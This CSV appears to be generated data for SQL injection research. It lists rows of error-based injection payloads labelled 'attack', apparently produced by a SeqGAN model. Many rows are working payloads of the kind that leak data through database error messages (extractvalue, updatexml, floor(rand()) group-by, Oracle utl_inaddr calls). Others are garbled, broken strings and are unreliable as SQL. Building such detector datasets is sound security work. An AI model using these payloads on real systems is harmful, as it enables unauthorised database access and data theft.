label,payload,family,payload_type,method,run_id,sample_index
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,955
attack,"1%,xrand    ,0  )  ||cthsys.drdsddrrdd_rdroddrksvd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,956
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,957
attack,"1%%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||''  =  'l  )   SELECT WNTE  (  SELECT DISiT  e  (  *   )    )     e  )    (  ,concat  )  5023,floor  =  )  )0x717a767a71,0x717a767a71,floor  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,958
attack,"1%q  5856 andx  )  )  5023,0x717a767a71,concat  =  t  (  case when   (  6055  )  ||chr  (  select   =   and and 7881  (  ||ch  (  112  )  ,concat  (  chr  (  9067  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,959
attack,"-3775'  )  *' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,960
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'exdutv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,961
attack,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sw""  =  ""tju",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,962
attack,"1""innas' like '9067sed_adress 5192 e where 0 4607 1  )   x    )zl_i",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,963
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'xwzf",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,964
attack,-bho.yNg' like 'yqa,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,965
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,966
attack,1'||  (  select 'gateygyp,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,967
attack,"1%5996   O'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'owbm' like 'fl"" like ""nk'  =  'ed_adrer.ggys   (  select   (  *   )    where INT  (  0x7171706a71,  select WHERE union select 3785  by 1 else 0 concat  =  00x717a767a71,0x78   )    ,0x717a767a71,floor  (  select dualliai",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,968
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '3074ju",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,969
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%--x'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,970
attack,1'+  (  select 'nwz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,971
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'i",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,972
attack,1%azxz7469)wnwandmasas  =  0 where 1   (  113  0  )  3326  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,973
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,974
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ywu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,975
attack,"1   a,1   )    )    )    )     (    R",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,976
attack,1%%,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,977
attack,1  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,978
attack,"-5606   =  0 and 6055  =  )  5023,0x717a767a71,floor  )  ,  =  1045,1   )    )     )  ,0x717a767a71,)  0   )    )   a and  =  and   c  (  0  )  a 0 by p  (  113  0  ,  112  )  ,0x717a767a71,  =   9891 0x717a767a71,1   )    )   from and dutabletossd_addr_geroyrfddr"" like ""gedr_(chsehs group when group union,1   dua",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,979
attack,1'||  (  select ' jwwyskxxxkchzlgezp,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,980
attack,"1%""  =  ""abt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,981
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'fyeuan",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,982
attack,"1'||  (  select 'rtwx' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,983
attack,"-9740'0x717a767a71,floor  =  ,  )  6055,0x717a767a71,floor  select   (  case when   (  113  *2   )     )  ,0x717a767a71,floor  =  9067,0x717a767a71,  )  6055,1   )    )     )  3326,0x78)   then 4493  )  )  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,984
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,985
attack,"1%'  =  ''   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '*",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,986
attack,"1'  )  5023tt_nadres   (    R    )     having  (  0x7171706a71,0x717a767a71,)  )   ,0x717a767a71,floor  (  =  0  )0x717a767a71,0x78   )    )    )  ,1   )    )    havingchrotlhhsys AND RNhLLLLIGIMIT    AND AASDIMIT FROMIs where information_schema.r  (  select a 3785 D by by 1 group by ANunionEe  )   (  x e.group where group 3931 union chr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,987
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'fvwfloorfloor",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,988
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'jzb""  =  ""'  =  '' like 'l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,989
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,990
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,991
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,992
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,993
attack,"t  =  4232  )  ,1   )    )   x where 1 LIUMINCT  (  *2   )    )    and FROM group coun   (  )    )    or 1 GR  =  a group by concat7469  =  a abaCTsychadrdredr.gcddbrdddxxgypbanan",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,994
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'z'  =  'ayydTqkhrowkkkunt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,995
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqnwzu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,996
attack,-7319 or r  (  112  #  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,997
attack,"-5996  5840  )  ,0x717a767a71,floor  )  ||chr  (  113  )  *2   )    )    )    )   # and xNNINUM FROM syw.USifs   (    (  SELECT group 1 ASEer.st_s   (    ROWho yM information_schema or select p  =  9891  )  9627,concat  (  ||chr  (  0  )  ,0x717a767a71,floor  (  113  )  ~  =  0 5584 from information_schema.colharxsddjchs",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,998
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,999
attack,"1%!%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""7158'  =  'aib",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1000
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'jq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1001
attack,1%q,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1002
attack,1wjz1rand,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1003
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1004
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  "".coswety",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1005
attack,"1%orG113  )  112    )     )  ' pr  (  select   (  case m   )    )    )    where 8877 FROM chr  (  select a else 0 union 1 x group1  )  ,floor  (  ,  =  ,1   91732   having 1  (  0  =   x",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1006
attack,0 LIER    )    and  )  case 0 5584 DISTINLxSTINCT  (  *   )    having l  =  SELECT union 6055  =  8382,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1007
attack,"1""inad_r_gt.sjradbdr.swer_groupchdhrowRANALIMIMegsyyT  21310  (  *  )   and 1 else 0 concat  select fromchr  (  113  )concat  =  aroseczddrbredros dYST  (  0x7171706a71,1 0   Rwountlt  (  select   (  4493  =  selectcthat_ros   (    )     SELECT DISTINCT",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1008
attack,1'||  (  select 'tu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1009
attack,"'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'rxevswz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1010
attack,"by  m   )    )    xEe where 5305  =  ,0x717a767a71,1   R  a  )  >   9325   (  *2   )    ,0x78 0 RM AS LISp AS LINTEE  (  6237  )  0  )  *22   )    )    )    )    or and select by xp pxp  )  ,1  )  ,0x717a767a71,floor  (  0x7171706a71,  (  0  )  ||chr  (  0  =  ,0x717a767a71,0x717a767a71,0x78   )    )    )  4232",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1011
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'sz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1012
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1013
attack,"1   =praddddr""  =  ""kddqwherels   (w  =  5023,  ,1   )    )    asi,concat  (  0x7171706a71,7562  )  ||chr  (  122  =  ,0x717a767a71,0x717a767a71,0x78  )   xpxab",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1014
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwi' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'a' like 'groupkEor FROM group else end  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1015
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'thy' like 'yb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1016
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1017
attack,-7864 x  1  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1018
attack,-50325996  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1019
attack,"1%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%5996",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1020
attack,-7319 or 1 x end  e  )  hl5   )    ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1021
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fv'  =  'zvbv'  =  '(    SELECT A LIMITeer.es   (  112",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1022
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'yfg' like 'd7drkxd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1023
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1024
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1025
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1026
attack,"1""  e  )  ||chr  (  6055  )  ,concat  (  *  )  ,0x717a767a71,floor  (  chr  (  select   (  *2   ),concatr  (  0  )  6055 *,concat  (  ,  (  case when from  (  0  )  ||r  (  ||chr  (  when  (  0  =  4386",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1027
attack,"xconcat'   )  ,concat  (  =  ,0x717a767a71,floor  =  1297,floor  =  0,1 from by and  (  0  )  ,0x717a767a71,0x78   ),4607 1 concat  (    =  6055,concat  (  0  )  a where information_schema.chrchr  (  rand  =  0  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1028
attack,"1'||  (  select 'tqhh-""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""whhr  (f  )0x717a767a71,0x717a767a71  )  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1029
attack,1'||  (  select 'xvuf88774493b      --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1030
attack,"1   (  5840||chr  (  select chr  =_r   (  el_naddunaddr.s   randwn  )  ,0x717a767a71,0x717a767a71,0x78   )    )  )  ,1   )    )    )     )0x717a767a710x78   )    )     )  ,1   )np mt_adr.gr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1031
attack,1'||  (  select 'e couju',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1032
attack,"1   t  (  ||chr  =   7881 hWr  (  rand  =  ,concat  8382,1   )    )     )  >  (  0  )   x  )  ,  )  ||chrr  (  a group by concat  chr  (  113  =  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1033
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1034
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1035
attack,"-8844%""  =  "",floor  113  )  ||chr  (  rand  )  (  *2   )  ,0x717a767a71,=    5023,  ,floor  =  *2   )    ,0x717a767a71,7562  eiam )    )     S   =  3326inadd_dWrrasxecteddcpr_driger",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1036
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1037
